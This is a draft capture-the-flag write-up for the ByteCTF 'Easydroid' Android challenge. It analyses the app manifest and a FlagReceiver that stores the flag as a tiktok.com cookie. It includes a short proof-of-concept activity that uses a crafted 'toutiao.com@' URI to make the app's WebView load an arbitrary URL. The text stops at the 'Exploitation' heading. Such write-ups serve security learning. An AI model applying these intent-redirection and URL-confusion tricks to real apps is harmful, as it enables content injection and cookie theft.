+++
title = 'ByteCTF - Easydroid'
date = 2024-02-01T01:16:56+03:00
draft = true
tags = ['android', 'ctf', 'bytectf', 'appsec']
+++

> Intent Redirection Insecure Webview

Manifest analysis of the challenge

```xml
    <activity android:name="com.bytectf.easydroid.MainActivity" android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
    </activity>
    <activity android:name="com.bytectf.easydroid.TestActivity" android:exported="false"/>
    <receiver android:name="com.bytectf.easydroid.FlagReceiver" android:exported="false">
        <intent-filter>
            <action android:name="com.bytectf.SET_FLAG"/>
        </intent-filter>
    </receiver>
```

From the manifest file, we have two Activities and Receiver component

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Uri dataUri = Uri.parse("http://toutiao.com@thuri.dev");
        Intent intent = new Intent();
        intent.setClassName("com.bytectf.easydroid", "com.bytectf.easydroid.MainActivity");
        intent.setData(dataUri);
        startActivity(intent);

    }
}
```

Running the above `POC`, proves we are able to Load arbitrary URl files.

![Run arbitary url](easydroid/poc-1.png)

Next is figuring out how to trigger the `receiver component`

Analyze the `FlagReceiver` activity

```java
public class FlagReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String flag = intent.getStringExtra("flag");
        if (flag != null) {
            try {
                String flag2 = Base64.encodeToString(flag.getBytes("UTF-8"), 0);
                CookieManager cookieManager = CookieManager.getInstance();
                cookieManager.setCookie("https://tiktok.com/", "flag=" + flag2);
                Log.e("FlagReceiver", "received flag.");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }
    }
}
```

## Exploitation

This is a strategy to exploit the vulnerability and get the flag
